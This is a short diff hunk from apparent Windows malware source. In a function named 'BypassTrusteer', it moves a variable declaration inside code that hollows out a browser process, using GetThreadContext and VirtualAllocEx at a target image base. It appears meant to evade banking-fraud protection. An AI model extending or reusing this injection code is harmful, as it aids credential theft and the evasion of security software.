@@ -570,12 +570,13 @@ DWORD BypassTrusteer(PROCESS_INFORMATION *processInfoParam, char *browserPath, c
    PROCESS_BASIC_INFORMATION processBasicInfo = { 0 };
    CONTEXT                   context          = { 0 };
    DWORD                     retSize;
+   PVOID                     remoteAddress    = NULL;
 
    context.ContextFlags = CONTEXT_FULL;
    if(!Funcs::pGetThreadContext(processInfo.hThread, &context))
       goto exit;
 
-   PVOID remoteAddress = Funcs::pVirtualAllocEx
+   remoteAddress = Funcs::pVirtualAllocEx
    (
       processInfo.hProcess,
       LPVOID(ntHeaders->OptionalHeader.ImageBase),
